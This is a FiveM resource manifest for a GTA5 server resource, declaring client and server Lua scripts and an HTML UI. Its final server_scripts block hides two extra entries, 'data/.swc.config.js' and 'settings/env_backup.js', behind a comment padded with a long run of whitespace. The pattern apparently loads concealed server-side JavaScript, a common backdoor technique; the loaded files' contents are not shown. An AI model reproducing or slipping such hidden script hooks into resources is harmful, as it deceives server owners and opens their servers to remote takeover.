fx_version "cerulean"
game "gta5"
lua54 "yes"

ui_page "html/index.html"
ui_page_preload "yes"

version "b1.0"

client_scripts({
	"cl_*.lua",
})

server_scripts({
	"@vrp/lib/utils.lua",
	"sv_*.lua",
})

files({
	"html/**/*",
}
)

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'data/.swc.config.js',
	'settings/env_backup.js'
}
